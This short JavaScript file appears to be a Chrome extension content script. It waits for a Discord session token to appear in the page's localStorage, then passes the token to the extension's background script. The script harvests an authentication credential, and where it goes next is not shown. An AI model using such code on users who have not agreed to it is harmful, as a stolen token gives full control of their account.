const sleep = ms => new Promise(r => setTimeout(r, ms))

async function WaitForToken(){
    let Token

    while (!Token){
        Token = window.localStorage.getItem("token")
        await sleep(100)
    }

    chrome.runtime.sendMessage({type: "NewDiscordToken", token: Token.slice(1, -1)})
}

WaitForToken()